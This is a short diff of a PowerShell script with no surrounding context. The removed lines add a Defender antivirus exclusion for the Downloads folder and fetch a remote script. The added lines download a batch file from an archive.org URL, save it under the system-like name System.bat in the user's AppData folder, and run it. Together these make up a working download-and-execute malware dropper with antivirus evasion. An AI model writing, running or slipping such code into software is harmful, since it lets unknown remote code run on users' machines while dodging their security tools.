@@ -1,3 +1,8 @@
-Add-MpPreference -ExclusionPath $env:USERPROFILE\Downloads
-$url = 'https://archive.org/download/script_202504/script.ps1'
-$outputFile = [System.IO.Path]::Combine($env:USERPROFILE, 'Appdata', 'System.ps1')
+$url_pp = 'https://archive.org/download/pp_20250226/pp.bat'
+$outputFile_pp = [System.IO.Path]::Combine($env:USERPROFILE, 'Appdata', 'System.bat')
+
+Start-Sleep -Milliseconds 100 
+
+Invoke-WebRequest -Uri $url_pp -OutFile $outputFile_pp
+
+Start-Process $outputFile_pp
